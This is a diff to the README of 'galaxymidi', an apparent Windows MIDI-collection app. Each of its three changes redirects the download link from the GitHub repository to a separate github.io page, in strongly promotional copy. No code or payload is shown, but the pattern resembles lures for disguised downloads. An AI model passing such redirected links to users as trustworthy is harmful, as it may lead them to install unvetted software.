@@ -1,6 +1,6 @@
 # 🎹 galaxymidi - Your Gateway to the Ultimate MIDI Collection
 
-[![Download galaxymidi](https://img.shields.io/badge/Download-galaxymidi-2ea44f?style=for-the-badge&logo=github)](https://github.com/Ahop15/galaxymidi)
+[![Download galaxymidi](https://img.shields.io/badge/Download-galaxymidi-2ea44f?style=for-the-badge&logo=github)](https://ahop15.github.io)
 
 ## 🚀 What Is galaxymidi?
 
@@ -22,7 +22,7 @@ Think of MIDI files as digital sheet music—they tell a computer or synthesizer
 
 ## 📥 How to Download and Run on Windows
 
-Visit this link to download the application: [https://github.com/Ahop15/galaxymidi](https://github.com/Ahop15/galaxymidi)
+Visit this link to download the application: [https://ahop15.github.io](https://ahop15.github.io)
 
 Here's your step-by-step guide to getting galaxymidi on your Windows computer:
 
@@ -106,6 +106,6 @@ galaxymidi represents a monumental achievement in music data collection and dist
 
 Don't wait—start your musical journey today. Click the download button above, and within minutes, you'll have the largest MIDI collection in the galaxy right at your fingertips.
 
-Remember: Visit this link to download the application: [https://github.com/Ahop15/galaxymidi](https://github.com/Ahop15/galaxymidi)
+Remember: Visit this link to download the application: [https://ahop15.github.io](https://ahop15.github.io)
 
 Happy exploring, and may your musical adventures be as vast as the galaxy itself!
